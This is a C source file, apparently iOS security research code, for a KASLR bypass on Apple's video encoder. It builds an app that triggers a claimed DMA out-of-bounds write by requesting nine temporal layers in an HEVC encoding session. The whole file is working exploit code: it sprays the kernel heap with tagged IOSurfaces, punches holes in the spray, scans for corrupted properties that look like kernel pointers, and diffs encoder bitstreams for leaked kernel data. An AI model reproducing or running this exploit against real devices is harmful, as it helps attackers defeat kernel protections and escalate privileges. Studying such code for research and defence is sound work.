/*
 * ave_kaslr_leak.c — KASLR Bypass via AVE DMA OOB
 *
 * Uses the confirmed DMA OOB write (NTL>8) to corrupt IOSurface property
 * storage. If the DMA overflow hits an IOSurface's property backing memory,
 * IOSurfaceCopyValue returns corrupted data — potentially kernel heap pointers
 * leaked to userspace, defeating KASLR.
 *
 * Secondary approach: compare encoded bitstream output between NTL=8 (safe)
 * and NTL=9 (overflow) to detect kernel data in the extra encoded bytes.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_kaslr_leak ave_kaslr_leak.c -Wno-deprecated-declarations
 *
 * Deployed as: AVEKaslr.app (com.research.avekaslr)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <signal.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

#define SPRAY_COUNT 512
#define HOLE_STRIDE 4
#define SPRAY_SIZE  16384
#define NUM_PROPS   5

static IOSurfaceRef g_surfaces[SPRAY_COUNT];
static const char *prop_names[NUM_PROPS] = {"Sentinel", "PtrA", "PtrB", "PtrC", "PtrD"};
static uint64_t prop_base[NUM_PROPS] = {
    0xDEAD000000000000ULL, 0x4141414141414141ULL, 0x4242424242424242ULL,
    0x4343434343434343ULL, 0x4444444444444444ULL
};

static uint64_t expected_val(int prop_idx, int surf_idx) {
    if (prop_idx == 0) return prop_base[0] | ((uint64_t)surf_idx << 16) | (surf_idx & 0xFFFF);
    return prop_base[prop_idx];
}

static IOSurfaceRef create_tagged_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 64, h = 64, bpr = 256, alloc = SPRAY_SIZE, fmt = 0x42475241;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc); CFRelease(nfmt);
    CFRelease(props);
    if (surf) {
        for (int j = 0; j < NUM_PROPS; j++) {
            uint64_t val = expected_val(j, idx);
            CFNumberRef nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &val);
            CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, prop_names[j], kCFStringEncodingUTF8);
            IOSurfaceSetValue(surf, key, nv);
            CFRelease(nv); CFRelease(key);
        }
    }
    return surf;
}

static int check_props(IOSurfaceRef surf, int idx, int verbose) {
    int corrupted = 0;
    for (int j = 0; j < NUM_PROPS; j++) {
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, prop_names[j], kCFStringEncodingUTF8);
        CFNumberRef val = (CFNumberRef)IOSurfaceCopyValue(surf, key);
        CFRelease(key);
        if (!val) { if (verbose) p("  surf[%d].%s: MISSING\n", idx, prop_names[j]); corrupted++; continue; }
        uint64_t got = 0;
        CFNumberGetValue(val, kCFNumberSInt64Type, &got);
        CFRelease(val);
        uint64_t exp = expected_val(j, idx);
        if (got != exp) {
            corrupted++;
            p("  !! surf[%d].%s: expected 0x%016llx got 0x%016llx",
              idx, prop_names[j], (unsigned long long)exp, (unsigned long long)got);
            if ((got >> 40) == 0xFFFFFF) p(" ** KERNEL PTR **");
            else if ((got >> 48) == 0xFFFF) p(" * possible kptr *");
            p("\n");
        }
    }
    return corrupted;
}

typedef struct { uint8_t *data; size_t len; size_t cap; } bitstream_buf_t;
static bitstream_buf_t g_bs;

static void bs_encode_cb(void *ref, void *opaque, OSStatus st,
                         VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
    if (!sb) return;
    CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
    if (!bb) return;
    size_t total = CMBlockBufferGetDataLength(bb);
    if (g_bs.len + total > g_bs.cap) {
        g_bs.cap = (g_bs.len + total) * 2;
        g_bs.data = realloc(g_bs.data, g_bs.cap);
    }
    CMBlockBufferCopyDataBytes(bb, 0, total, g_bs.data + g_bs.len);
    g_bs.len += total;
}

static void encode_cb(void *ref, void *opaque, OSStatus st,
                      VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
}

static int do_encode(int ntl, int frames, uint8_t pixel_fill,
                     void (*cb)(void*,void*,OSStatus,VTEncodeInfoFlags,CMSampleBufferRef)) {
    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop); CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn); CFRelease(fn);
    int cbcount = 0;
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
        kCMVideoCodecType_HEVC, NULL, sa, NULL, cb, &cbcount, &sess);
    CFRelease(sa);
    if (st || !sess) return -1;
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n; int v;
    v = 1; n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);
    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -1; }
    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
    if (!pool) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -2; }
    for (int i = 0; i < frames; i++) {
        if (g_signal) break;
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, pixel_fill, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    VTCompressionSessionInvalidate(sess); CFRelease(sess);
    return cbcount;
}

static void spray_leak_round(int round, int *total_leaks) {
    p("--- Round %d: Spray %d surfaces with %d properties each ---\n", round, SPRAY_COUNT, NUM_PROPS);
    for (int i = 0; i < SPRAY_COUNT; i++) g_surfaces[i] = create_tagged_surface(i);
    int created = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
    p("  Created: %d\n", created);
    int freed = 0;
    for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; freed++; }
    p("  Freed %d holes (stride=%d)\n", freed, HOLE_STRIDE);
    p("  Encoding NTL=9, fill=0x00, 5 frames...\n");
    int cb = do_encode(9, 5, 0x00, encode_cb);
    p("  Encode callbacks: %d\n", cb);
    usleep(200000);
    p("  Checking %d properties across %d surfaces...\n", NUM_PROPS, SPRAY_COUNT - freed);
    int ok = 0, bad = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (!g_surfaces[i]) continue;
        int c = check_props(g_surfaces[i], i, 0);
        if (c > 0) bad += c; else ok++;
    }
    p("  Round %d result: %d surfaces clean, %d property corruptions\n", round, ok, bad);
    *total_leaks += bad;
    for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
}

static void hexdump(const uint8_t *buf, size_t len, size_t base_offset) {
    for (size_t i = 0; i < len; i += 16) {
        p("  %06zx: ", base_offset + i);
        for (size_t j = 0; j < 16 && i + j < len; j++) p("%02x ", buf[i + j]);
        p("\n");
    }
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler);
    signal(SIGSEGV, sig_handler);
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_kaslr_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;
    p("=== AVE KASLR Leak Probe ===\nMode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0); p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0); p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("Modes:\n");
        p("  spray_leak     - Spray IOSurfaces + NTL=9 encode, check for corrupted properties\n");
        p("  bitstream_leak - Compare NTL=8 vs NTL=9 encoded output for extra kernel data\n");
        p("  multi_spray    - 10 rounds of spray_leak for higher hit probability\n");
        int pfds[2];
        if (pipe(pfds) == 0) {
            long pipemax = fpathconf(pfds[0], _PC_PIPE_BUF);
            p("\nPipe buffer info: _PC_PIPE_BUF=%ld\n", pipemax);
            close(pfds[0]); close(pfds[1]);
        }
    } else if (strcmp(mode, "spray_leak") == 0) {
        int leaks = 0;
        spray_leak_round(0, &leaks);
        if (leaks > 0) p("\n*** PROPERTY CORRUPTION DETECTED — potential KASLR leak ***\n");
        else p("\nNo corruption detected. Try multi_spray for more attempts.\n");

    } else if (strcmp(mode, "bitstream_leak") == 0) {
        p("Phase 1: Baseline encode NTL=8 (no overflow)\n");
        g_bs.data = malloc(1024 * 1024); g_bs.len = 0; g_bs.cap = 1024 * 1024;
        int cb8 = do_encode(8, 5, 0x00, bs_encode_cb);
        size_t len8 = g_bs.len;
        uint8_t *data8 = malloc(len8);
        memcpy(data8, g_bs.data, len8);
        p("  NTL=8: %d callbacks, %zu bytes bitstream\n", cb8, len8);
        p("Phase 2: Overflow encode NTL=9\n");
        g_bs.len = 0;
        int cb9 = do_encode(9, 5, 0x00, bs_encode_cb);
        size_t len9 = g_bs.len;
        p("  NTL=9: %d callbacks, %zu bytes bitstream\n", cb9, len9);
        p("Phase 3: Comparing bitstreams\n");
        size_t minlen = len8 < len9 ? len8 : len9;
        size_t maxlen = len8 > len9 ? len8 : len9;
        int diffs = 0;
        for (size_t i = 0; i < minlen; i++) {
            if (data8[i] != g_bs.data[i]) {
                if (diffs < 32)
                    p("  Diff at offset %zu: NTL8=0x%02x NTL9=0x%02x\n", i, data8[i], g_bs.data[i]);
                diffs++;
            }
        }
        p("  Common region: %zu bytes, %d differences\n", minlen, diffs);
        if (len9 > len8) {
            size_t extra = len9 - len8;
            p("  NTL=9 has %zu EXTRA bytes (potential kernel data):\n", extra);
            hexdump(g_bs.data + len8, extra > 256 ? 256 : extra, len8);
            int kptr = 0;
            for (size_t i = len8; i + 7 < len9; i += 8) {
                uint64_t val;
                memcpy(&val, g_bs.data + i, 8);
                if ((val >> 40) == 0xFFFFFF) {
                    p("  ** KERNEL PTR at bitstream+%zu: 0x%016llx **\n", i, (unsigned long long)val);
                    kptr++;
                }
            }
            if (kptr) p("\n*** %d KERNEL POINTERS FOUND IN BITSTREAM ***\n", kptr);
        } else if (len9 < len8) {
            p("  NTL=9 is %zu bytes SHORTER (unexpected)\n", len8 - len9);
        } else {
            p("  Same length — no extra data region\n");
        }
        if (len9 > len8) {
            size_t extra = len9 - len8;
            int has_nonzero = 0;
            for (size_t i = len8; i < len9; i++)
                if (g_bs.data[i]) { has_nonzero = 1; break; }
            if (!has_nonzero) p("  Extra region is all zeros — DMA wrote zero-filled pixel data\n");
        }
        free(data8); free(g_bs.data); g_bs.data = NULL;

    } else if (strcmp(mode, "multi_spray") == 0) {
        p("=== Multi-Round Spray Leak (10 rounds) ===\n");
        int total_leaks = 0;
        for (int r = 0; r < 10; r++) {
            if (g_signal) { p("Signal %d caught, stopping\n", g_signal); break; }
            spray_leak_round(r, &total_leaks);
            usleep(500000);
        }
        p("\n=== Total property corruptions across 10 rounds: %d ===\n", total_leaks);
        if (total_leaks > 0) p("*** KASLR LEAK VECTOR CONFIRMED ***\n");
        else p("No corruptions detected. Physical adjacency not achieved.\n");

    } else {
        p("Unknown mode: %s\n", mode);
    }

    if (g_signal) p("\nCaught signal %d\n", g_signal);
    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
